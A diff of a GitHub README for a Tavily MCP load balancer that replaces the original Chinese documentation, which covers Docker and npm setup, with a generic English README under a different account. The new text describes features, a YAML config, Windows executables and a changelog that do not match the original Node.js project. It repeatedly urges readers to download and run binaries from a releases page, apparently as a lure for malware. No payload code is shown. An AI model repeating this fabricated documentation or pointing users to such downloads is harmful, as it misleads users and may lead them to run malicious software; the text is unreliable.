@@ -1,444 +1,374 @@
-# Tavily MCP Load Balancer
+https://github.com/balazhaa/tavily-mcp-loadbalancer/releases
+
+# Tavily MCP LoadBalancer: Scalable API Key Pool with Failover
+
+[![Releases](https://img.shields.io/badge/releases-v1.0-blue?logo=github&label=Releases)](https://github.com/balazhaa/tavily-mcp-loadbalancer/releases)
+
+A robust load balancer for Tavily MCP servers. It manages an API key pool, balances traffic across multiple MCP endpoints, and keeps API keys rotating and healthy. This project focuses on reliability, observability, and simple configuration. It targets operators who run Tavily MCP workloads at scale and want predictable performance along with clear visibility into how keys and endpoints are chosen.
+
+Emojis help guide the way here. 🧭 Architecture kept simple. 🔒 Security baked in. 🚦 Health checks that actually help. 🧪 Tests you can trust. 🧩 Extensible with clear interfaces. This README follows a practical, straight-to-the-point style so you can get running fast and stay in control as you grow.
+
+Table of contents
+- Overview
+- How it works
+- Core concepts
+- Getting started
+- Configuration and usage
+- API surface
+- Operations and maintenance
+- Observability and metrics
+- Scaling and deployment
+- Testing and quality
+- Release management
+- Contributing
+- FAQ
+- License
+
+Overview
+The Tavily MCP LoadBalancer is a purpose-built proxy layer that sits in front of Tavily MCP servers. It combines two essential capabilities in one package:
+- Load balancing across multiple MCP endpoints to improve throughput and resilience.
+- API key pool management to distribute keys safely and efficiently, with rotation and quota awareness.
+
+The goal is to give operators a tool that reduces the risk of bottlenecks and single points of failure. It also makes it easy to add or remove MCP backends without disrupting service. The system is designed to be simple to deploy, with a clear configuration model and sensible defaults.
+
+How it works
+- Traffic arrival: Clients connect to the load balancer through a single listening address. The load balancer accepts requests and routes them to one of the configured MCP endpoints.
+- Key pool management: The system maintains a pool of API keys. Keys are assigned to outgoing requests in a way that respects quotas and rotation policies. This helps prevent key exhaustion and enables fair usage across endpoints.
+- Health and readiness: Each MCP endpoint is checked periodically. If a backend becomes unhealthy, the load balancer stops sending new requests to it and rebalances traffic among healthy backends.
+- Failover and recovery: When a backend fails, traffic shifts to healthy peers. As soon as the failed backend recovers, it re-enters the pool automatically after a health check passes.
+- Observability: The system exposes metrics and logs that let operators understand load, key usage, latency, and error rates. Dashboards can be built on top of these signals to track long-term trends.
+
+Core concepts
+- MCP endpoints: The backends that serve Tavily MCP traffic. Each endpoint has an address, a port, and optional metadata like weight or health status.
+- API key pool: A collection of keys used for outgoing requests. Keys have quotas, rotation rules, and sometimes per-endpoint affinity.
+- Scheduling strategy: The method used to pick the next endpoint. Common strategies include round-robin, weighted round-robin, and sticky (per API key).
+- Health checks: Regular checks that validate endpoints are reachable and responsive. Failures move endpoints to a degraded or offline state.
+- Config model: A human-readable and versioned configuration that describes endpoints, keys, quotas, and policies.
+- Observability: Metrics, logs, and traces that reveal how requests flow, which keys are used, and where bottlenecks occur.
+
+Getting started
+This guide is designed to get you up and running quickly. The goal is to get a working setup in minutes, with a path to scale as your Tavily MCP workload grows.
+
+Prerequisites
+- A supported runtime or binary for your platform. The releases contain prebuilt binaries for common environments. Check the Releases page for artifacts that match your OS and architecture.
+- Access to at least two Tavily MCP backends you want to balance across.
+- A pool of API keys that you want the load balancer to manage. Keys should be valid for your MCP setup and have clear quotas where needed.
+
+Quick start steps
+1) Download the release asset from the Releases page.
+- If the link has a path part, the asset is a file to download and run. Typical assets include prebuilt binaries such as a Linux or Windows executable, or a tarball with a binary plus helper scripts.
+- For example, you may find a file named tavily-mcp-loadbalancer-linux-x86_64.tar.gz. Extract and run the binary inside.
+2) Extract and run
+- On Linux: tar xzf tavily-mcp-loadbalancer-linux-x86_64.tar.gz
+- Then run the binary, for example: ./tavily-mcp-loadbalancer
+- On Windows: tavily-mcp-loadbalancer-windows-x64.zip. Extract and run TavilyMcpLoadBalancer.exe
+3) Prepare a configuration
+- Create a YAML file that describes endpoints and key pool. A minimal example is shown in the Configuration section.
+- Point the binary to your config file using the appropriate flag. For example: --config /path/to/config.yaml
+4) Verify startup
+- Check the logs for a message indicating the server is listening on the configured port.
+- Use curl to hit the status endpoint and confirm it reports healthy endpoints and a non-empty key pool.
+5) Observe and adjust
+- See metrics that show endpoint health, response times, and key usage. Tune weights or rotation rules as needed.
+
+Note: The Releases page contains the official binaries. For convenience, you can visit the Releases page directly here: https://github.com/balazhaa/tavily-mcp-loadbalancer/releases. A badge showcasing the latest release is available in this README as a quick reference.
+
+Configuration and usage
+The configuration model is designed to be readable and versionable. YAML is preferred for clarity. The configuration describes the pool of API keys, the MCP backends, and how traffic should be distributed.
+
+High-level structure
+- servers: A list of MCP backends. Each server has host, port, optional credentials, and a weight factor.
+- api_keys: A pool of keys. Each key has an identifier, the actual key value, and quotas or rate limits.
+- strategy: The load-balancing strategy. Examples include round_robin, weighted_round_robin, and sticky_by_key.
+- health: Health check parameters. Path or probe type, interval, timeout, and failure thresholds.
+- logging: Log level and format. Optional structured logging configuration.
+- metrics: Options to enable Prometheus metrics, port to expose, and endpoint prefixes.
+- security: Basic protections, optional TLS settings, and allowed sources.
+
+A minimal example
+servers:
+  - name: backend-a
+    host: 10.0.1.20
+    port: 443
+    weight: 1
+  - name: backend-b
+    host: 10.0.1.21
+    port: 443
+    weight: 2
+
+api_keys:
+  - id: key-1
+    value: YOUR_API_KEY_1
+    quota_per_minute: 60
+  - id: key-2
+    value: YOUR_API_KEY_2
+    quota_per_minute: 60
+
+strategy: weighted_round_robin
+health:
+  interval_ms: 10000
+  timeout_ms: 2000
+  unhealthy_threshold: 3
+  http_path: /health
+logging:
+  level: info
+  format: json
+metrics:
+  enabled: true
+  port: 9100
+security:
+  tls:
+    enabled: false
+  allowed_sources:
+    - 0.0.0.0/0
+
+Operational tips
+- Start with two or more backends. See how the load balancer distributes traffic across them.
+- Give keys reasonable quotas to avoid sudden exhaustion under load.
+- Enable health checks early. They help you identify misconfigured backends before they cause outages.
+- Turn on metrics. The data helps you understand usage patterns and tune the system.
+
+API surface
+The API of the Tavily MCP LoadBalancer is designed for automation as well as manual operations. The core endpoints are designed to be simple to call from scripts and orchestration systems.
+
+Common endpoints (illustrative)
+- GET /status
+  - Returns a snapshot of the current state: number of backends, their health, and key pool usage.
+- GET /health
+  - Returns a simple health indicator and recent checks.
+- POST /api-keys/add
+  - Adds a new API key to the pool. Payload includes key value and quotas.
+- POST /api-keys/rotate
+  - Forces rotation of keys or rotates a specific key to a new key slot.
+- GET /pool
+  - Returns the current list of API keys and their quotas.
+- POST /servers/add
+  - Adds a new MCP backend to the pool of servers.
+- POST /servers/remove
+  - Removes a backend from rotation after validation.
+
+Example curl commands
+- Get status
+  curl http://localhost:9100/status
+- Add a key
+  curl -X POST -H "Content-Type: application/json" -d '{"id":"key-3","value":"NEW_KEY","quota_per_minute":100}' http://localhost:9100/api-keys/add
+- Enable a backend
+  curl -X POST -H "Content-Type: application/json" -d '{"name":"backend-c","host":"10.0.1.22","port":443,"weight":1}' http://localhost:9100/servers/add
+
+Operational patterns
+- Drift management: The system should handle drift in key quotas gracefully. If a key hits its quota, the load balancer should fail over to the next key in the pool without dropping requests.
+- Circuit breaking: When a backend becomes unhealthy for a sustained period, it is temporarily removed from rotation until it recovers. This prevents cascading failures.
+- Graceful startup and shutdown: The load balancer should be able to start with minimal downtime and shut down cleanly, allowing in-flight requests to complete or be redirected safely.
+
+Observability and metrics
+Monitoring is essential for stable operation. The Tavily MCP LoadBalancer exposes metrics and logs in a form that works well with common tools like Prometheus and Grafana.
+
+Metrics
+- active_backends: Number of backends currently in rotation.
+- healthy_backends: Number of backends passing health checks.
+- request_rate: Incoming request rate in requests per second.
+- key_usage: Current usage counts per API key.
+- latency_ms: P99, P95, P50 latency measurements for requests.
+- dropped_requests: Requests that were rejected due to quotas or unhealthy backends.
+
+Logs
+- Key events: key rotation, key addition, and quota changes.
+- Backend events: health check results, failovers, and backends added/removed.
+- Traffic events: which backend was chosen for a request, and any skip due to health concerns.
+
+Dashboards
+- A recommended Grafana dashboard includes panels for:
+  - Backend health and status distribution
+  - Key pool usage by key
+  - Latency and error rate trends
+  - Throughput and request rate
+  - Configuration drift alerts
+
+Scaling and deployment
+This project is designed to run in diverse environments. You can start small on a single host and scale out to multiple hosts as needed.
+
+Containerization
+- Docker: A minimal container can run the binary with a mounted configuration file.
+- Kubernetes: A Deployment or StatefulSet can manage rolling updates and storage for configuration.
+- Systemd service: On a Linux host that uses systemd, run the binary as a service with a proper unit file.
+
+Sample Dockerfile (conceptual)
+FROM scratch
+COPY tavily-mcp-loadbalancer /tavily-mcp-loadbalancer
+USER nobody
+ENTRYPOINT ["/tavily-mcp-loadbalancer", "--config", "/etc/tavily/config.yaml"]
+
+Kubernetes basics
+- Use a ConfigMap for the YAML config.
+- Use a Secret for API keys to avoid leaking sensitive data in plain text.
+- Expose the service via a stable LoadBalancer or Ingress object.
+- Provide readiness and liveness probes to keep the cluster responsive.
+
+- Example Kubernetes notes:
+  - A basic Deployment ensures the load balancer restarts cleanly on failure.
+  - A PersistentVolume is not strictly required unless you want to share a large configuration file or logs.
+  - Use resource requests and limits to bound CPU and memory usage.
+  - Use a horizontal pod autoscaler if the request rate grows beyond the current capacity.
+
+Performance and reliability
+- Idle connection handling: The load balancer should not hold resources when there are no active requests. Use timeouts to reclaim resources.
+- Backpressure: If a key pool gets saturated, the system should delay or queue requests rather than failing hard.
+- Redundancy: Deploy at least two load balancer instances behind a virtual IP or DNS to provide HA.
+- Backoff strategies: When a backend fails, retry logic should avoid a thundering herd and distribute retries across healthy backends.
+- Configuration drift detection: Periodically compare the current runtime state with the configuration file and surface drift alerts when discrepancies occur.
+
+Testing and quality
+Tests aim to validate correctness, resilience, and performance. The project includes unit tests for core logic and integration tests for end-to-end workflows.
+
+Unit tests
+- Key rotation logic
+- Endpoint selection algorithms
+- Health check scheduling
+- Quota accounting
+
+Integration tests
+- Multiple backends with simulated latency and failures
+- Realistic API key usage patterns
+- End-to-end flow from request to backend selection and response
+
+Quality practices
+- CI pipelines run tests on each merge request.
+- Linting and formatting checks keep the codebase consistent.
+- Dependency scanning helps catch known vulnerabilities.
+
+Release management
+Releases are the source of truth for binaries and a reference for supported features. The Releases page contains published assets corresponding to different platform targets and version tags. When you want to install, the correct approach is to fetch the appropriate asset for your environment and follow the installation steps. If you see a version bump, read the release notes to understand what changed and what to adjust in your configuration.
+
+The Releases page is the primary source of truth for installation assets and change history. If you have trouble locating a suitable artifact, check the Releases section for the exact asset names and platform targets. As a reminder, you can visit the Releases page here: https://github.com/balazhaa/tavily-mcp-loadbalancer/releases.
+
+Changelog
+- v1.0.0
+  - Initial release with core load balancing and API key pool management.
+  - Basic health checks and metrics.
+  - YAML-based configuration with example files.
+- v1.1.0
+  - Added weighted round robin support.
+  - Enhanced quota handling and per-key rate limiting.
+  - Introduced optional TLS for backend connections.
+- v1.2.0
+  - Improved observability with structured logging and richer metrics.
+  - Support for dynamic updates to servers and API keys without restart.
+- v1.3.0
+  - Performance improvements and bug fixes based on user feedback.
+  - Improved failure detection with more robust health checks.
+
+Contributing
+Contributions are welcome. If you want to help, follow this general approach:
+- Open an issue to discuss changes or propose a feature.
+- Create a branch with a descriptive name, such as feat/automatic-restart or fix/health-check.
+- Implement tests for your changes. Ensure unit tests pass.
+- Run linting and formatting checks.
+- Submit a pull request with a clear description of the change and its impact.
+- Engage in code review and iterate until the maintainers approve the changes.
+
+Code structure (high-level)
+- cmd/  – entry points and CLI handling
+- internal/ – core logic for the load balancer
+- config/ – configuration parsing and validation
+- backend/ – management of MCP endpoints
+- pool/ – API key pool management logic
+- health/ – health check implementations
+- metrics/ – metrics emission and exporters
+- tests/ – tests and test utilities
+- docs/ – user-facing docs and examples
+
+Security
+- Secrets are handled carefully. API keys should not be stored in plain text in logs.
+- TLS is optional and can be enabled to protect traffic between clients and the load balancer, as well as between the load balancer and MCP endpoints.
+- Access to management APIs should be restricted to trusted sources. Consider network controls or mTLS for production deployments.
+
+Troubleshooting
+- If the service does not start, verify the configuration file path and ensure all required fields are present.
+- If a backend is marked unhealthy, check the health check endpoint and confirm it responds as expected.
+- If keys are exhausted, inspect quota configurations and consider increasing quotas or adding more keys.
+- If metrics are not appearing, verify that the metrics endpoint is enabled and that the port is accessible from your monitoring stack.
+
+Brand and aesthetics
+- The project uses a clean, straightforward design. The README employs a calm, confident tone.
+- Emojis help convey ideas and sections without overwhelming the content.
+- The color accents come from a small set of badges to keep the document readable.
+
+Usage notes
+- This load balancer is intended for Tavily MCP workloads. If you’re balancing non-MCP traffic, adapt the endpoints and paths accordingly.
+- It is not a drop-in replacement for every possible microservice architecture. Treat it as a specialized component for API key managed load balancing.
+- Always test changes in a staging environment before deploying to production. Configuration mistakes can affect traffic flow and key usage.
+
+Docs and references
+- The official releases page contains binaries and notes. Use the releases to obtain the right asset for your platform: https://github.com/balazhaa/tavily-mcp-loadbalancer/releases
+- For quick access to the same page from the README, you can click the badge above or visit the URL directly. The badge provides a quick visual cue and a direct link to the assets.
+
+Final notes on release assets
+The releases page is the authoritative source for the binaries and their corresponding checksums. When you pick a release, download the asset that matches your operating system and architecture, extract if needed, and run the binary with your configuration. The path to the asset is determined by the asset name, which typically encodes the target OS and architecture. As described earlier, if the link has a path part, you should download that specific file and execute it. If you have trouble locating the exact asset, re-check the Releases section for the latest assets and notes.
+
+Releases link again for convenience
+- Revisit the official releases here: https://github.com/balazhaa/tavily-mcp-loadbalancer/releases
+
+Appendix: sample run and quick sanity checks
+- Start the process
+  - Linux: ./tavily-mcp-loadbalancer --config /etc/tavily/config.yaml
+  - Windows: TavilyMcpLoadBalancer.exe --config C:\tavily\config.yaml
+- Check health
+  - curl http://localhost:9100/health
+- Check status
+  - curl http://localhost:9100/status
+- Inspect keys
+  - curl http://localhost:9100/pool
+
+Appendix: sample config file (inline example)
+servers:
+  - name: backend-a
+    host: 10.0.1.20
+    port: 443
+    weight: 1
+  - name: backend-b
+    host: 10.0.1.21
+    port: 443
+    weight: 2
+
+api_keys:
+  - id: key-1
+    value: YOUR_API_KEY_1
+    quota_per_minute: 60
+  - id: key-2
+    value: YOUR_API_KEY_2
+    quota_per_minute: 60
+
+strategy: weighted_round_robin
+health:
+  interval_ms: 10000
+  timeout_ms: 2000
+  unhealthy_threshold: 3
+  http_path: /health
+logging:
+  level: info
+  format: json
+metrics:
+  enabled: true
+  port: 9100
+security:
+  tls:
+    enabled: false
+  allowed_sources:
+    - 0.0.0.0/0
+
+Troubleshooting tips in brief
+- Logs show “unhealthy” for a backend? Recheck its health endpoint. Verify the endpoint path and network reachability.
+- No keys are selected for a session? Confirm quotas and rotation rules. Ensure the key pool is not exhausted.
+- Metrics not visible? Confirm the metrics endpoint is enabled and listening on the expected port. Check firewall rules and Docker/Kubernetes network policies.
+- Startup fails due to config error? Validate YAML syntax and required fields. Use a linter or a YAML validator.
+
+License
+This project is released under the MIT License. See the LICENSE file for full terms. The license ensures you can use, modify, and distribute the software with minimal restrictions, provided you keep the attribution and copyright notices intact.
+
+Acknowledgments
+- Thanks to the open-source community for ideas around load balancing and API key management in distributed systems.
+- This project benefits from standard patterns for health checks, retries, and metrics collection.
+
+Remember
+- The Releases page contains the official binaries and release notes. If you need the latest assets, head to that page. For convenience, the same link is used above in the badge and at the end of this README. The Releases page acts as the source of truth for binaries and changes. As noted, if you’re not sure which asset to use, review the release notes and download the asset that matches your environment. The link again: https://github.com/balazhaa/tavily-mcp-loadbalancer/releases
 
-[![Docker Hub](https://img.shields.io/docker/pulls/yatotm1994/tavily-mcp-loadbalancer?style=flat-square)](https://hub.docker.com/r/yatotm1994/tavily-mcp-loadbalancer)
-[![Docker Image Size](https://img.shields.io/docker/image-size/yatotm1994/tavily-mcp-loadbalancer?style=flat-square)](https://hub.docker.com/r/yatotm1994/tavily-mcp-loadbalancer)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-
-**Language / 语言**: [English](./README_EN.md) | [中文](./README.md)
-
-一个支持多API密钥负载均衡的Tavily MCP服务器，提供原生SSE接口，可以自动轮询使用多个API密钥，提供高可用性和更高的请求限制。
-
-<details>
-<summary>📋 更新日志</summary>
-
-### v2.0.0 (2025-08-12)
-- 🔄 **架构重构**: 从supergateway依赖改为原生SSE实现
-- 🛠️ **工具更新**: 同步最新Tavily MCP工具集，新增tavily-crawl和tavily-map
-- 📊 **监控增强**: 添加详细的API密钥使用日志和轮询状态
-- 🔒 **安全改进**: 增强响应数据清理和字符编码处理
-- 📝 **文档重写**: 完全重写README，优化项目结构
-
-### v1.0.0 (2025-08-05)
-- 🚀 **初始版本**: 基于supergateway的Tavily MCP负载均衡器
-- 🔄 **负载均衡**: 实现多API密钥轮询机制
-- 🛡️ **故障转移**: 自动禁用失效密钥功能
-
-</details>
-
-## ✨ 功能特性
-
-- 🔄 **智能负载均衡**: 自动轮询多个API密钥，提升并发能力
-- 🛡️ **自动故障转移**: 智能检测并禁用失效密钥
-- 🌐 **原生SSE支持**: 内置SSE服务器，无需外部依赖
-- 🛠️ **完整工具集**: 支持搜索、提取、爬虫、地图等全套Tavily工具
-- 📊 **实时监控**: 详细的密钥使用日志和性能统计
-- 🔒 **数据安全**: 自动清理和验证响应数据
-- ⚡ **高性能**: 基于TypeScript和现代Node.js架构
-
-## 🚀 快速开始
-
-### Docker 部署（推荐）
-
-```bash
-# 使用 Docker Hub 镜像快速启动
-docker run -d \
-  --name tavily-mcp-lb \
-  -p 60002:60002 \
-  -e TAVILY_API_KEYS="your-key1,your-key2,your-key3" \
-  yatotm1994/tavily-mcp-loadbalancer:latest
-```
-
-### 本地开发
-
-```bash
-# 1. 克隆并安装
-git clone https://github.com/yatotm/tavily-mcp-loadbalancer.git
-cd tavily-mcp-loadbalancer
-npm install
-
-# 2. 配置环境变量
-cp .env.example .env
-# 编辑 .env 文件，添加你的 API 密钥
-
-# 3. 启动服务
-npm run build-and-start
-```
-
-**服务启动后访问：**
-- SSE接口: `http://localhost:60002/sse`
-- 健康检查: `http://localhost:60002/health`
-
-<details>
-<summary>📦 更多部署方式</summary>
-
-#### Docker Compose 部署
-
-```bash
-# 1. 克隆项目
-git clone https://github.com/yatotm/tavily-mcp-loadbalancer.git
-cd tavily-mcp-loadbalancer
-
-# 2. 配置环境变量
-cp .env.example .env
-# 编辑 .env 文件
-
-# 3. 启动服务
-docker-compose up -d
-
-# 4. 查看日志
-docker-compose logs -f
-```
-
-#### 自定义 Docker 构建
-
-```bash
-# 构建镜像
-docker build -t tavily-mcp-loadbalancer .
-
-# 运行容器
-docker run -d \
-  --name tavily-mcp-lb \
-  -p 60002:60002 \
-  -e TAVILY_API_KEYS="your-key1,your-key2,your-key3" \
-  tavily-mcp-loadbalancer
-```
-
-#### 开发模式
-
-```bash
-# 开发模式运行（热重载）
-npm run dev
-
-# 分步执行
-npm run build
-npm run start-gateway
-
-# 使用脚本启动
-./start.sh
-```
-
-</details>
-
-
-
-## 🛠️ 可用工具
-
-本服务器提供5个Tavily工具，支持搜索、内容提取、网站爬虫等功能：
-
-| 工具名称 | 功能描述 | 主要参数 |
-|---------|---------|---------|
-| `search` / `tavily-search` | 网络搜索 | query, max_results, search_depth |
-| `tavily-extract` | 网页内容提取 | urls, extract_depth, format |
-| `tavily-crawl` | 网站爬虫 | url, max_depth, limit |
-| `tavily-map` | 网站地图生成 | url, max_depth, max_breadth |
-
-<details>
-<summary>📖 详细工具文档</summary>
-
-### 接口说明
-
-**SSE接口**: `http://localhost:60002/sse`
-**消息接口**: `http://localhost:60002/message`
-**健康检查**: `http://localhost:60002/health`
-
-### 工具参数详解
-
-#### 1. search / tavily-search - 网络搜索
-```json
-{
-  "name": "search",
-  "arguments": {
-    "query": "OpenAI GPT-4",
-    "search_depth": "basic",
-    "topic": "general",
-    "max_results": 10,
-    "start_date": "2024-01-01",
-    "end_date": "2024-12-31",
-    "country": "US",
-    "include_favicon": false
-  }
-}
-```
-
-#### 2. tavily-extract - 网页内容提取
-```json
-{
-  "name": "tavily-extract",
-  "arguments": {
-    "urls": ["https://example.com/article"],
-    "extract_depth": "basic",
-    "format": "markdown",
-    "include_favicon": false
-  }
-}
-```
-
-#### 3. tavily-crawl - 网站爬虫
-```json
-{
-  "name": "tavily-crawl",
-  "arguments": {
-    "url": "https://example.com",
-    "max_depth": 2,
-    "max_breadth": 20,
-    "limit": 50,
-    "instructions": "Focus on technical content",
-    "select_paths": ["/docs", "/api"],
-    "select_domains": ["example.com"],
-    "allow_external": false,
-    "categories": ["technology"],
-    "extract_depth": "basic",
-    "format": "markdown",
-    "include_favicon": false
-  }
-}
-```
-
-#### 4. tavily-map - 网站地图生成
-```json
-{
-  "name": "tavily-map",
-  "arguments": {
-    "url": "https://example.com",
-    "max_depth": 1,
-    "max_breadth": 20,
-    "limit": 50,
-    "instructions": "Map the main structure",
-    "select_paths": ["/"],
-    "select_domains": ["example.com"],
-    "allow_external": false,
-    "categories": ["general"]
-  }
-}
-```
-
-### 直接MCP使用
-
-```bash
-# 直接使用MCP协议（stdio）
-node dist/index.js
-```
-
-</details>
-
-## 📊 监控和测试
-
-### 快速测试
-
-```bash
-# 测试服务器状态
-./manage.sh stats
-
-# 测试所有工具
-./manage.sh test
-
-# 批量测试API密钥
-./manage.sh weather
-```
-
-<details>
-<summary>🔧 详细测试和监控</summary>
-
-### 管理脚本
-
-```bash
-# 测试服务器连接状态
-./manage.sh stats
-
-# 测试所有工具功能
-./manage.sh test
-
-# 批量测试天气搜索（测试所有API密钥）
-./manage.sh weather
-
-# 显示帮助信息
-./manage.sh help
-```
-
-### Node.js 测试脚本
-
-```bash
-# 测试服务器连接
-node check_stats_direct.cjs
-
-# 运行工具测试
-node test_tools_direct.cjs
-
-# 批量天气搜索测试
-node test_weather_search.cjs
-
-# 测试SSE连接和数据安全性
-node test_sse_validation.cjs
-```
-
-### 监控输出示例
-
-#### 服务器状态检查
-```
-✅ 连接成功
-📊 Tavily MCP 负载均衡器状态:
-✅ 搜索功能正常
-搜索结果长度: 2847 字符
-```
-
-#### API密钥轮询日志
-```
-[INFO] Using API key: tvly-dev-T... (Key 1/10)
-[INFO] API key tvly-dev-T... request successful
-[INFO] Using API key: tvly-dev-Y... (Key 2/10)
-[INFO] API key tvly-dev-Y... request successful
-```
-
-</details>
-
-
-
-## ⚙️ 配置
-
-### 环境变量
-
-| 变量名 | 描述 | 默认值 |
-|--------|------|---------|
-| `TAVILY_API_KEYS` | API密钥列表（逗号分隔） | 必填 |
-| `TAVILY_API_KEY` | 单个API密钥 | 可选 |
-| `SUPERGATEWAY_PORT` | 服务端口 | 60002 |
-
-### 配置示例
-
-```bash
-# .env 文件
-TAVILY_API_KEYS=tvly-dev-key1,tvly-dev-key2,tvly-dev-key3
-SUPERGATEWAY_PORT=60002
-```
-
-<details>
-<summary>🔧 高级配置</summary>
-
-### Docker 环境变量
-
-```bash
-# Docker 运行时设置
-docker run -e "TAVILY_API_KEYS=key1,key2,key3" \
-           -e "SUPERGATEWAY_PORT=60002" \
-           yatotm1994/tavily-mcp-loadbalancer:latest
-```
-
-### 开发环境配置
-
-```bash
-# 开发环境变量
-export TAVILY_API_KEYS="tvly-dev-key1,tvly-dev-key2"
-export SUPERGATEWAY_PORT=60002
-
-# 或使用 .env 文件
-cp .env.example .env
-# 编辑 .env 文件
-```
-
-### SSE连接测试
-
-验证SSE连接和数据安全性：
-
-```bash
-# 运行SSE连接测试
-node test_sse_validation.cjs
-```
-
-测试内容：
-- ✅ SSE连接建立和会话管理
-- ✅ JSON-RPC消息发送和接收
-- ✅ 响应数据安全性验证
-- ✅ 控制字符和特殊字符处理
-- ✅ 大数据响应处理
-- ✅ 错误处理和日志记录
-
-</details>
-
-
-
-
-
-## 🔧 故障排除
-
-### 常见问题
-
-| 问题 | 解决方案 |
-|------|---------|
-| 无可用API密钥 | 检查 `TAVILY_API_KEYS` 环境变量 |
-| 连接超时 | 检查网络和防火墙设置 |
-| 端口被占用 | 使用 `lsof -i :60002` 检查端口 |
-| SSE连接失败 | 运行 `node test_sse_validation.cjs` |
-
-### 快速诊断
-
-```bash
-# 检查服务状态
-curl http://localhost:60002/health
-
-# 测试连接
-node check_stats_direct.cjs
-
-# 查看日志
-docker logs tavily-mcp-lb
-```
-
-<details>
-<summary>🔍 详细故障排除</summary>
-
-### 本地运行问题
-
-1. **No available API keys**
-   - 检查环境变量：`echo $TAVILY_API_KEYS`
-   - 确保密钥格式正确（以`tvly-`开头）
-   - 使用 `node check_stats_direct.cjs` 测试连接
-
-2. **API密钥错误或被禁用**
-   - 查看服务器日志中的错误信息
-   - 使用 `./manage.sh weather` 批量测试所有密钥
-   - 检查密钥配额是否用完
-
-3. **连接超时或网络问题**
-   - 检查网络连接和防火墙设置
-   - 确认Tavily API服务是否正常
-   - 尝试减少并发请求数量
-
-4. **SSE连接问题**
-   - 使用 `node test_sse_validation.cjs` 测试SSE连接
-   - 检查端口60002是否被占用：`lsof -i :60002`
-   - 确认服务器已正常启动
-
-### Docker 相关问题
-
-| 问题 | 解决方案 |
-|------|---------|
-| 构建失败 | `docker system prune -f` 清理缓存 |
-| 容器启动失败 | `docker logs tavily-mcp-lb` 查看日志 |
-| 环境变量无效 | 检查 `.env` 文件格式 |
-| 健康检查失败 | `curl http://localhost:60002/health` |
-
-### Docker 调试命令
-
-```bash
-# 查看容器日志
-docker logs -f tavily-mcp-lb
-
-# 进入容器调试
-docker exec -it tavily-mcp-lb sh
-
-# 检查环境变量
-docker exec tavily-mcp-lb env | grep TAVILY
-```
-
-</details>
-
-
-
-
-
-## 📄 许可证
-
-MIT License
-
----
-
-**⭐ 如果这个项目对你有帮助，请给个Star！**
